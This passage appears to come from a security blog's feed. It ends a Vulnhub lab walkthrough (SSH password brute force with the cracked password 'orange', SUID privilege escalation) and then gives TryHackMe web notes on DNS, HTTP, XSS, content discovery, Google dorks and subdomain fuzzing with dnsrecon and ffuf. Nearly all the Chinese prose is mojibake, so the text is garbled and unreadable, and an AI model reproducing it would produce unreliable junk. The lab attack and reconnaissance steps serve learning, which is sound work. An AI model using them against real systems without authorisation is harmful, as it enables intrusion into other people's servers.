title="flag4"></a>flag4</h3><p>åœ¨/etc/passwdä¸­å¯ä»¥æŸ¥çœ‹åˆ°flag4</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271700064.png" alt="image-20240327170006991"></p><p>åœ¨ä¿¡æ¯æ”¶é›†çš„æ—¶å€™æˆ‘ä»¬çŸ¥é“22ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çˆ†ç ´flag4çš„å¯†ç  åˆ©ç”¨sshå»ç™»å½•flag4ç”¨æˆ·</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271713760.png" alt="image-20240327171331628"></p><p>å¯†ç çˆ†ç ´å‡ºæ¥äº†ï¼Œå»sshç™»å½•å³å¯</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">password:</span> orange<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271718896.png" alt="image-20240327171851703"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>å…ˆè¯•è¯•suidææƒ</p><p>å‚è€ƒæ–‡ç« ï¼›</p><p><a href="https://xz.aliyun.com/t/12535?time__1311=mqmhD50KBKDK50Hq4+OrEG8Yt47K6xx&amp;alichlgref=https://www.google.com/#toc-6">https://xz.aliyun.com/t/12535?time__1311=mqmhD50KBKDK50Hq4%2BOrEG8Yt47K6xx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271720612.png" alt="image-20240327172034487"></p><p>å¯ä»¥è¿›è¡Œsuidææƒ</p><h5 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h5><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271727286.png" alt="image-20240327172738233"></p><p>æ€»ç»“:</p><p>æ€»ä½“æ€è·¯ä¸éš¾ï¼Œå…ˆä¿¡æ¯æ”¶é›†ç«¯å£å¼€æ”¾æƒ…å†µå’Œä½¿ç”¨çš„æ˜¯ä»€ä¹ˆwebæœåŠ¡ ç„¶åå¯»æ‰¾æ¼æ´ç‚¹ ç”±æ™®é€šç”¨æˆ·ææƒåˆ°rootç”¨æˆ·</p><p>flag1æ˜¯åœ¨rceä¹‹ååœ¨ç½‘ç«™æ ¹ç›®å½•é‡Œé¢çš„</p><p>flag2æ˜¯åœ¨é…ç½®æ–‡ä»¶é‡Œé¢çš„</p><p>flag3æ˜¯é€šè¿‡ä¿®æ”¹adminå¯†ç ï¼Œåœ¨åå°é‡Œé¢çš„</p><p>flag4æ˜¯é€šè¿‡çˆ†ç ´sshå¯†ç  ç™»å½•è¿›å»å³å¯</p><p>flag5å°±æ˜¯suidææƒå³å¯</p>]]></content>
    
    
    <categories>
      
      <category>é¶æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web Fundamentals</title>
    <link href="/2024/03/08/Web%20Fundamentals/"/>
    <url>/2024/03/08/Web%20Fundamentals/</url>
    
    <content type="html"><![CDATA[<h1 id="Web-Fundamentals"><a href="#Web-Fundamentals" class="headerlink" title="Web Fundamentals"></a>Web Fundamentals</h1><h2 id="How-The-Web-Works"><a href="#How-The-Web-Works" class="headerlink" title="How The Web Works"></a>How The Web Works</h2><h3 id="DNS-in-detail"><a href="#DNS-in-detail" class="headerlink" title="DNS in detail"></a>DNS in detail</h3><p>ä¸‹é¢è¿™ä¸ªå›¾æ˜¯DNSå·¥ä½œæ—¶çš„æµç¨‹å›¾</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402272317525.png" alt="image-20240227231710035"></p><p>æ‰“å¼€ç½‘ç«™é¦–å…ˆçœ‹åˆ°<img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402272322241.png" alt="image-20240227232219172"></p><p>è¿™ä¸ªåœ°æ–¹ï¼Œå¯ä»¥æ›´æ¢DNSè®°å½•çš„ç±»å‹</p><p>ç„¶åæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹CNAME</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402272323623.png" alt="image-20240227232319538"></p><p>ç„¶ååé¢çš„æ ¹æ®è¦æ±‚æ¥å³å¯</p><h3 id="HTTP-in-detail"><a href="#HTTP-in-detail" class="headerlink" title="HTTP in detail"></a>HTTP in detail</h3><p>httpæ˜¯è¶…æ–‡æœ¬ä¼ è¾“åè®® httpsåˆ™æ˜¯æ¯”å®ƒæ›´å®‰å…¨äº†</p><p>ä¸‹é¢çš„å›¾ç‰‡æ˜¯å¯¹urlçš„ä¸€äº›è§£æ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402292303282.png" alt="image-20240229230309164"></p><p>ä¸‹é¢æ˜¯ä¸€äº›çŠ¶æ€ç çš„ä»‹ç»</p><p>å¤§è‡´åˆ†ä¸ºäº”ç±»</p><table><thead><tr><th>100-199 ä¿¡æ¯å“åº”</th></tr></thead><tbody><tr><td>200-299 æˆåŠŸ</td></tr><tr><td>300-399 é‡å®šå‘</td></tr><tr><td>400-499å®¢æˆ·ç«¯é”™è¯¯</td></tr><tr><td>500-599æœåŠ¡å™¨é”™è¯¯</td></tr></tbody></table><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402292345248.png" alt="image-20240229234520132"></p><h3 id="How-websites-work"><a href="#How-websites-work" class="headerlink" title="How websites work"></a>How websites work</h3><p>è¿™ä¸ªæ¨¡å—ä¸»è¦æ˜¯å…³äºhtmlå’Œjavascriptçš„ä»‹ç» ä»¥åŠå­˜åœ¨çš„ä¸€äº›å®‰å…¨é—®é¢˜</p><p>æœ‰çš„htmlé¡µé¢å¯èƒ½ä¼šå­˜åœ¨ä¸€äº›æ•æ„Ÿä¿¡æ¯</p><p>è®°å½•ä¸€ä¸‹è¿™ä¸ªhtmlæ³¨å…¥</p><p>æ¼æ´ç‚¹å°±æ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œä¸€ä¸ªä¸¥æ ¼çš„è¿‡æ»¤ ç„¶åå°±å¯¼è‡´ç”¨æˆ·å¯ä»¥æ„é€ æ¶æ„çš„javasciptä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸­ å½“ç”¨æˆ·å»è®¿é—®æ—¶ å°±ä¼šè§¦å‘æ¼æ´</p><p>å…¶å®è¿™ä¸ªä¹Ÿæ˜¯xssçš„ä¸€ç§</p><p>ä¾‹å¦‚ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403022228277.png" alt="image-20240302222805079"></p><p>åƒè¿™æ ·å°±èƒ½è·³è½¬åˆ°æˆ‘ä»¬æ„é€ çš„ç½‘é¡µä¸Šé¢</p><p>é˜²å¾¡æªæ–½ï¼š</p><p>1.è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ å¯ä»¥å°†&lt;&gt;ç­‰è¿™äº›ç¬¦å·è¿›è¡Œå®ä½“åŒ–</p><p>2.å¯¹è¾“å…¥è¿›è¡Œç™½åå•é™åˆ¶</p><p>3.ä½¿ç”¨ä¸€äº›å®‰å…¨çš„æ¡†æ¶</p><h3 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h3><p>è¿™ä¸ªæˆ¿é—´æ˜¯æŠŠä¸Šé¢çš„ä¸œè¥¿ç»“åˆäº†ä¸€ä¸‹</p><p>ç„¶åå¯¹ç”¨æˆ·è®¿é—®ç½‘ç«™ ä¸­é—´å‘ç”Ÿçš„äº‹æƒ…åšäº†ä¸€ä¸ªæ¦‚æ‹¬</p><p>ç¬¬ä¸€æ­¥:ç”¨æˆ·å‘èµ·è®¿é—®çš„è¯·æ±‚ (è¿™æ—¶æ˜¯åŸŸåçš„å½¢å¼ æˆ‘ä»¬éœ€è¦é€šè¿‡DNSå°†å…¶è½¬æ¢æˆipåœ°å€)</p><p>ç¬¬äºŒæ­¥ï¼šåœ¨æœ¬åœ°DNSå¯»æ‰¾æ˜¯å¦æœ‰ç¼“å­˜ æœ‰çš„è¯å°±å°†å…¶æŠ“æ¢æˆipåœ°å€ ç„¶åå†è¿›è¡Œä¸‹ä¸€æ­¥ å¦‚æœæ²¡æœ‰çš„è¯ è½¬åˆ°é€’å½’DNS</p><p>ç¬¬ä¸‰æ­¥:æŸ¥è¯¢æƒå¨DNSæœåŠ¡å™¨å’Œæ ¹DNSæœåŠ¡å™¨</p><p>ç¬¬å››æ­¥:å°†åŸŸåè½¬æ¢æˆipåœ°å€</p><p>ç¬¬äº”æ­¥:ç„¶åé€šè¿‡WAFçš„æ£€æµ‹</p><p>ç¬¬å…­æ­¥:é€šè¿‡è´Ÿè½½å‡è¡¡å™¨ ç¼“è§£ç½‘ç»œæµé‡</p><p>ç¬¬ä¸ƒæ­¥:ä½¿ç”¨httpåè®®æˆ–è€…httpsåè®®æ¥å‘é€</p><p>ç¬¬å…«æ­¥:ä½¿ç”¨ä»€ä¹ˆç±»å‹çš„æ–¹æ³•è¿›è¡Œè®¿é—® (getæˆ–è€…postç­‰)</p><p>ç¬¬ä¹æ­¥:è®¿é—®æ•°æ®åº“ ä»æ•°æ®åº“ä¸­è·å–å†…å®¹</p><p>ç¬¬åæ­¥ï¼šwebæœåŠ¡å™¨å‘å®¢æˆ·ç«¯è¿”å›ç›¸å…³çš„ç•Œé¢</p><h2 id="Introduction-to-Web-Hacking"><a href="#Introduction-to-Web-Hacking" class="headerlink" title="Introduction to Web Hacking"></a>Introduction to Web Hacking</h2><h3 id="Walking-An-Application-éå†"><a href="#Walking-An-Application-éå†" class="headerlink" title="Walking An Application (éå†)"></a>Walking An Application (éå†)</h3><p>é¦–å…ˆæŸ¥çœ‹ç½‘é¡µæºä»£ç  å»è®¿é—® ä¸‹é¢è¿™ä¸ªå³å¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031922678.png" alt="image-20240303192238481"></p><p>ç„¶åæˆ‘ä»¬åœ¨htmlä¸­å¯ä»¥æ‰¾åˆ°è¿™ä¸ª</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031935916.png" alt="image-20240303193546845"></p><p>ç‚¹å‡»å³å¯æ‰¾åˆ°ç¬¬äºŒä¸ªç©ºçš„ç­”æ¡ˆ</p><p>ç¬¬ä¸‰ä¸ªç©º æˆ‘ä»¬å…ˆè§‚å¯Ÿ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031938696.png" alt="image-20240303193836631"></p><p>éƒ½æ˜¯åœ¨/assetsç›®å½•ä¸‹çš„ ç„¶åæˆ‘ä»¬å»è®¿é—®è¿™ä¸ªassets</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031939117.png" alt="image-20240303193926986"></p><p>å¯ä»¥æ‰¾åˆ°ç¬¬ä¸‰ä¸ªflag</p><p>ç„¶åç¬¬å››ä¸ªflagçš„è¯æˆ‘ä»¬å…ˆè¿›è¡Œä¸€ä¸ªä¿¡æ¯çš„æœç´¢</p><p>åœ¨ç½‘é¡µæºä»£ç æœ€ä¸‹é¢æœ‰ä¸€ä¸ªç½‘å€ æˆ‘ä»¬å…ˆå»è®¿é—® </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031949589.png" alt="image-20240303194935412"></p><p>æˆ‘åŸæœ¬æ˜¯æ‰¾åˆ°äº†å®ƒçš„ä¸€ä¸ªç™»å½•ç•Œé¢ ç”¨å¼±å£ä»¤ç™»å½•è¿›å»å‘ç°ä¸æ˜¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031952961.png"></p><p>ç„¶ååœ¨logé‚£é‡Œå¯ä»¥æ‰¾åˆ°zipæ–‡ä»¶çš„ä¸‹è½½åœ°å€ ä¸‹è½½ä¹‹åå°±æ˜¯äº†</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031953462.png" alt="image-20240303195335345"></p><p>ç¬¬äº”ä¸ªflagå…¶å®å°±æ˜¯ä¸€ä¸ªç»•è¿‡å‰ç«¯çš„</p><p>å°±æŠŠé‚£ä¸ªæ¡†ç»™åˆ é™¤æ‰å°±è¡Œäº†</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032116213.png" alt="image-20240303211617077"></p><p>ç¬¬å…­ä¸ªflagå…¶å®å°±æ˜¯åœ¨ä¸€ä¸ªjsæ–‡ä»¶é‡Œé¢çš„ä¸€ä¸ªåœ°æ–¹ æ‰“ä¸€ä¸ªæ–­ç‚¹ è®©å…¶åœ¨åˆ·æ–°çš„æ—¶å€™åœç•™</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032133659.png" alt="image-20240303213329528"></p><p>ç¬¬ä¸ƒä¸ªflag  åœ¨Contactç•Œé¢ä¸Šé¢åˆ›å»ºä¸€äº›æ•°æ® ç„¶åå‘é€ åœ¨ç½‘ç»œä¸­æŸ¥çœ‹ç›¸å…³çš„ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032151826.png" alt="image-20240303215156748"></p><p>åœ¨ç½‘ç»œä¸­æŸ¥çœ‹ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032153763.png" alt="image-20240303215312706"></p><p>æ€»ç»“:è¿™ä¸ªæˆ¿é—´å°±æ˜¯æ•™äº†å¦‚ä½•æŸ¥çœ‹æºä»£ç  ä»¥åŠä¸€äº›åœ¨å¼€å‘è€…æ¨¡å¼ä¸‹ ä½œä¸ºä¸€ä¸ªæ¸—é€æµ‹è¯•äººå‘˜éœ€è¦å…³æ³¨çš„ç‚¹</p><h3 id="Content-Discovery"><a href="#Content-Discovery" class="headerlink" title="Content Discovery"></a>Content Discovery</h3><p>ä¸»è¦è¿˜æ˜¯å’Œä¿¡æ¯æ”¶é›†æœ‰å…³çš„çŸ¥è¯†</p><p>ä»æ‰‹åŠ¨å’Œè‡ªåŠ¨ä»¥åŠå¼€æºä¿¡æ¯çš„æŸ¥è¯¢å‡ ä¸ªæ–¹é¢è®²è¿°</p><p>ä¿¡æ¯æ”¶é›†çš„ç‚¹:</p><p>1.robots.txtæ–‡ä»¶ (ä¸è¢«çˆ¬è™«çˆ¬åˆ°) </p><p>2.Faviconï¼ˆç½‘ç«™å›¾æ ‡ï¼‰è¿™ä¸ªæœ‰çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥è·å–è¿™äº›å›¾æ ‡çš„ä¸€äº›md5å€¼ ç„¶åå»OWASPç½‘ç«™å›¾æ ‡æ•°æ®åº“ä¸Šé¢æ‰¾åˆ°å…¶æ¡†æ¶ è¿›ä¸€æ­¥çš„åšå‡ºåˆ©ç”¨</p><p>æ•°æ®åº“çš„ç½‘ç«™:<a href="https://wiki.owasp.org/index.php/OWASP_favicon_database">OWASPç½‘ç«™å›¾æ ‡æ•°æ®åº“ - OWASP</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032218704.png" alt="image-20240303221826632"></p><p>å¯ä»¥åˆ©ç”¨curlè·å–å›¾æ ‡çš„md5å€¼ ç„¶åå»æŸ¥è¯¢</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032220553.png" alt="image-20240303222000460"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032222893.png" alt="image-20240303222244831"></p><p>3.sitemap.xml </p><p>æœ‰äº›æ¯”è¾ƒéš¾æµè§ˆçš„ç½‘é¡µè¿™é‡Œé¢å¯èƒ½ä¼šå‡ºç°</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032244842.png" alt="image-20240303224443710"></p><p>4.httpæ ‡å¤´</p><p>æŠ“ä¸ªåŒ…çš„äº‹ å°±æ˜¯çœ‹ä¸€äº›æœåŠ¡å™¨çš„ä¿¡æ¯å’Œç”¨ä»€ä¹ˆç¼–ç¨‹è¯­è¨€ä»¥åŠç‰ˆæœ¬çš„ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032248784.png" alt="image-20240303224851629"></p><p>5.æŸ¥åˆ°æ˜¯ä»€ä¹ˆæ¡†æ¶äº†ä¹‹åè¿›ä¸€æ­¥è¿›è¡Œä¿¡æ¯æ”¶é›†</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032301836.png" alt="image-20240303230102745"></p><p>åœ¨ç½‘é¡µæºä»£ç é‡Œé¢æ‰¾åˆ°äº†ä¸€ä¸ªè·¯å¾„ è®¿é—®æœ‰ä¸ªç™»å½•çš„åœ°å€ ç”¨æˆ·åå’Œå¯†ç å·²ç»ç»™äº† ç„¶åå°±æ˜¯ç™»å½•å³å¯</p><p>6.åˆ©ç”¨è°·æ­Œæœç´¢</p><p>å–„ç”¨è°·æ­Œ èƒ½æŸ¥åˆ°ä¸å°‘ä¸œè¥¿ (è¿™é‡Œçš„è¯å°±æ˜¯ä¸€äº›è°·æ­Œè¯­æ³•)</p><p>ä¸‹é¢ä»‹ç»ä¸€äº›ç®€å•çš„ å…·ä½“çš„è¯·å‚è€ƒ:<a href="https://en.wikipedia.org/wiki/Google_hacking">Google hacking - Wikipedia</a></p><table><thead><tr><th>filter</th><th>ä¾‹å­</th><th>æè¿°</th></tr></thead><tbody><tr><td>site</td><td>site:edu.cn</td><td>ä»…è¿”å›æŒ‡å®šç½‘ç«™ç±»å‹çš„è®°å½•</td></tr><tr><td>inurl</td><td>inurl:admin</td><td>è¿”å›çš„urlä¸­å«æœ‰æŒ‡å®šçš„å­—ç¬¦</td></tr><tr><td>filetype</td><td>filetype:pdf â€œæŸ¥è¯¢çš„ä¸œè¥¿â€</td><td>è¿”å›æŒ‡å®šç±»å‹çš„æ–‡ä»¶</td></tr><tr><td>intitle</td><td>intitle:admin</td><td>è¿”å›çš„æ ‡é¢˜ä¸­å«æœ‰æŒ‡å®šçš„å­—ç¬¦</td></tr></tbody></table><p>7.Wappalyzer</p><p>è¿™å°±æ˜¯ä¸€ä¸ªæ’ä»¶äº† èƒ½çœ‹è¯­è¨€çš„ç±»å‹å’Œç‰ˆæœ¬ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032322357.png" alt="image-20240303232236252"></p><p>8.Wayback Machine</p><p>ç½‘ç«™:<a href="https://archive.org/web/">https://archive.org/web/</a></p><p>æ˜¯å¯è¿½æº¯åˆ° 90 å¹´ä»£åæœŸçš„ç½‘ç«™å†å²æ¡£æ¡ˆã€‚ æ‚¨å¯ä»¥æœç´¢ä¸€ä¸ªåŸŸåï¼Œå®ƒä¼šä¸€ç›´å‘æ‚¨æ˜¾ç¤º æœåŠ¡æŠ“å–äº†ç½‘é¡µå¹¶ä¿å­˜äº†å†…å®¹ã€‚æ­¤æœåŠ¡å¯ä»¥ å¸®åŠ©å‘ç°å½“å‰ç½‘ç«™ä¸Šå¯èƒ½ä»å¤„äºæ´»åŠ¨çŠ¶æ€çš„æ—§é¡µé¢ã€‚</p><p>9.github</p><p>è¿™ä¸ªä¹ŸæŒºé‡è¦çš„ ä¸Šé¢ä¹Ÿæœ‰ä¸å°‘çš„ä¿¡æ¯</p><p>ä¸Šé¢å¯èƒ½æœ‰ä¸€äº›æ•æ„Ÿçš„ä¿¡æ¯(å¯èƒ½æ˜¯æƒé™æ²¡è®¾ç½®å¥½ æˆ–è€…é—æ¼)</p><p>10.S3 Buckets</p><p>S3ç³»åˆ— å­˜å‚¨æ¡¶æ˜¯ Amazon AWS æä¾›çš„ä¸€é¡¹å­˜å‚¨æœåŠ¡ï¼Œå…è®¸äººä»¬ å°†æ–‡ä»¶ç”šè‡³é™æ€ç½‘ç«™å†…å®¹ä¿å­˜åœ¨å¯è®¿é—®çš„äº‘ä¸­ é€šè¿‡ HTTP å’Œ HTTPSã€‚æ–‡ä»¶çš„æ‰€æœ‰è€…å¯ä»¥è®¾ç½®è®¿é—®æƒé™ ä½¿æ–‡ä»¶å…¬å¼€ã€ç§æœ‰ç”šè‡³å¯å†™ã€‚æœ‰æ—¶è¿™äº› è®¿é—®æƒé™è®¾ç½®ä¸æ­£ç¡®ï¼Œæ— æ„ä¸­å…è®¸è®¿é—® ä¸åº”å‘å…¬ä¼—æä¾›çš„æ–‡ä»¶ã€‚S3 çš„æ ¼å¼ buckets çš„æ•°æ®ç±»å‹ä¸º httpï¼ˆsï¼‰ï¼š//<strong>{name}ã€‚</strong><a href="http://s3.amazonaws.com/"><strong>s3.amazonaws.com</strong></a> {name} ç”±æ‰€æœ‰è€…å†³å®šçš„åœ°æ–¹ï¼Œä¾‹å¦‚ <a href="http://tryhackme-assets.s3.amazonaws.com/">tryhackme-assets.s3.amazonaws.com</a>ã€‚ å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼å‘ç° S3 å­˜å‚¨æ¡¶ï¼Œä¾‹å¦‚åœ¨ ç½‘ç«™çš„é¡µé¢æºä»£ç ã€GitHub å­˜å‚¨åº“ï¼Œç”šè‡³è‡ªåŠ¨åŒ– è¿‡ç¨‹ã€‚ä¸€ç§å¸¸è§çš„è‡ªåŠ¨åŒ–æ–¹æ³•æ˜¯ä½¿ç”¨å…¬å¸åç§° åè·Ÿå¸¸ç”¨æœ¯è¯­ï¼Œå¦‚ {name}-assetsã€{name}-wwwã€{name}-publicã€**{**<strong>name}</strong>-private ç­‰</p><p>11.è‡ªåŠ¨åŒ–å·¥å…· å°±æ˜¯ä¸€äº›åå°æ‰«æçš„å·¥å…· </p><p>åƒæ˜¯dirsearchç­‰ å…¶å®ä¸»è¦è¿˜æ˜¯çœ‹å­—å…¸çš„å¼ºå¤§</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041519253.png" alt="image-20240304151929060"></p><p>è¿™æ˜¯æˆ‘ç”¨dirsearchæ‰«æçš„ç»“æœ ä½†è¿˜æœ‰ä¸€ä¸ªmoå¼€å¤´çš„æ–‡ä»¶æˆ‘æ‰«æä¸åˆ° </p><p>æˆ‘æ˜¯ç”¨çš„ thmç»™çš„æ‰«æåˆ°çš„</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041523790.png" alt="image-20240304152317688"></p><p>æ€»ç»“:ä»‹ç»äº†ä¸€äº›ä¿¡æ¯æ”¶é›†çš„çŸ¥è¯†</p><h3 id="Subdomain-Enumeration-å­åŸŸæšä¸¾"><a href="#Subdomain-Enumeration-å­åŸŸæšä¸¾" class="headerlink" title="Subdomain Enumeration (å­åŸŸæšä¸¾)"></a>Subdomain Enumeration (å­åŸŸæšä¸¾)</h3><p>è¿™ä¸ªæˆ¿é—´æ˜¯å¯»æ‰¾å­åŸŸçš„å‡ ç§æ–¹æ³• ç›®çš„æ˜¯ä¸ºäº†æ‰©å¤§æˆ‘ä»¬åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­çš„æ”»å‡»é¢</p><p>ä¸‰ç§ä¸åŒçš„å­åŸŸæšä¸¾æ–¹æ³•ï¼šBrute Forceã€OSINTï¼ˆå¼€æºæ™ºèƒ½ï¼‰å’ŒVirtual Host(è™šæ‹Ÿä¸»æœº)ã€‚</p><p>1.SSL/TLS è¯ä¹¦</p><p>ç›¸å…³çš„ç½‘ç«™:</p><p><a href="https://crt.sh/">crt.sh |è¯ä¹¦æœç´¢</a></p><p><a href="https://ui.ctsearch.entrust.com/ui/ctsearchui">Entrust è¯ä¹¦æœç´¢ - Entrustï¼Œ Inc.</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041717063.png" alt="image-20240304171731897"></p><p>ç„¶åå¯ä»¥åœ¨ä¸Šé¢çš„ä¸¤ä¸ªç½‘ç«™ä¸Šé¢è¾“å…¥åŸŸå è¿›è¡Œå­åŸŸçš„æŸ¥è¯¢</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041722551.png" alt="image-20240304172208426"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041722377.png" alt="image-20240304172231226"></p><p>2.åˆ©ç”¨æœç´¢å¼•æ“</p><p>åˆ©ç”¨è°·æ­Œç­‰æœç´¢å¼•æ“ å¯ä»¥åˆ©ç”¨è°·æ­Œè¯­æ³• è¿›è¡Œæœç´¢</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-site:www<span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span> siteï¼š*<span class="hljs-selector-class">.domain</span>.com<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„æ„æ€æŠŠ<a href="http://www.domain.comè¿™ä¸ªåŸŸåç»™ä¸¢æ‰/">www.domain.comè¿™ä¸ªåŸŸåç»™ä¸¢æ‰</a> ç„¶ååŒ¹é…å…¶ä»–çš„åŸŸå</p><p>3.DNSæš´åŠ›ç ´è§£</p><p>å¯ä»¥ä½¿ç”¨ä¸€äº›å·¥å…·å¯¹åŸŸåè¿›è¡Œæš´åŠ›ç ´è§£ ä¾‹å¦‚dnsrecon</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041735401.png" alt="image-20240304173544295"></p><p>-dæŒ‡å®šäº†åŸŸå -t brtæŒ‡å®šäº†æ‰§è¡Œæ¨¡å¼</p><p>ä¸Šé¢æ˜¯å®ƒè‡ªå¸¦çš„å­—å…¸åº”è¯¥ ç„¶åæˆ‘ä»¬å®é™…æƒ…å†µè¦ç”¨çš„è¯ éœ€è¦æŒ‡æ˜å­—å…¸çš„ä½ç½®</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041755996.png" alt="image-20240304175505891"></p><p>è¿˜æœ‰å…¶ä»–çš„å·¥å…· æ¯”å¦‚ **Sublist3r **æ˜¯ç”¨pythonå†™çš„</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041800461.png" alt="image-20240304180036303"></p><p>4.Virtual Host(è™šæ‹Ÿä¸»æœº)</p><p>æŸäº›å­åŸŸå¹¶ä¸æ€»æ˜¯æ‰˜ç®¡åœ¨å¯å…¬å¼€è®¿é—®çš„ DNS ç»“æœä¸­ï¼Œä¾‹å¦‚ Web åº”ç”¨ç¨‹åºæˆ–ç®¡ç†é—¨æˆ·çš„å¼€å‘ç‰ˆæœ¬ã€‚ç›¸åï¼ŒDNS è®°å½•å¯ä»¥ä¿å­˜åœ¨ä¸“ç”¨ DNS æœåŠ¡å™¨ä¸Šï¼Œä¹Ÿå¯ä»¥è®°å½•åœ¨å¼€å‘äººå‘˜è®¡ç®—æœºä¸Šçš„ /etc/hosts æ–‡ä»¶ï¼ˆæˆ– Windows ç”¨æˆ·çš„ cï¼š\windows\system32\drivers\etc\hosts æ–‡ä»¶ï¼‰ä¸­ï¼Œè¯¥æ–‡ä»¶å°†åŸŸåæ˜ å°„åˆ° IP åœ°å€ã€‚</p><p>ç”±äºå½“ä»å®¢æˆ·ç«¯è¯·æ±‚ç½‘ç«™æ—¶ï¼ŒWeb æœåŠ¡å™¨å¯ä»¥ä»ä¸€å°æœåŠ¡å™¨æ‰¿è½½å¤šä¸ªç½‘ç«™ï¼Œå› æ­¤æœåŠ¡å™¨å¯ä»¥ä» Host æ ‡å¤´ä¸­çŸ¥é“å®¢æˆ·ç«¯éœ€è¦å“ªä¸ªç½‘ç«™ ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹å®ƒè¿›è¡Œæ›´æ”¹å¹¶ç›‘æ§å“åº”æ¥åˆ©ç”¨æ­¤ä¸»æœºæ ‡å¤´ï¼Œä»¥æŸ¥çœ‹æˆ‘ä»¬æ˜¯å¦å‘ç°äº†ä¸€ä¸ªæ–°ç½‘ç«™ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ffufæ¥å®ç°è¿™ä¸ªåŠŸèƒ½</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>SecLists<span class="hljs-regexp">/Discovery/</span>DNS/namelist.txt -H <span class="hljs-string">&quot;Host: FUZZ.acmeitsupport.thm&quot;</span> -u ipåœ°å€ -fs &#123;<span class="hljs-keyword">size</span>&#125;<br></code></pre></td></tr></table></figure><p>æ¥è§£é‡Šä¸€ä¸‹æŒ‡ä»¤ -wæ˜¯æŒ‡å®šäº†å­—å…¸æ–‡ä»¶ -Hæ˜¯æŒ‡å®šäº†Hostçš„ä¿¡æ¯ -uæ˜¯æŒ‡å®šurlåœ°å€ åé¢çš„ -fsæ˜¯ä¸€ä¸ªè¿‡æ»¤å™¨ {size}æ˜¯sizeå‡ºç°æ¬¡æ•°æœ€å¤šçš„å€¼</p><p><img 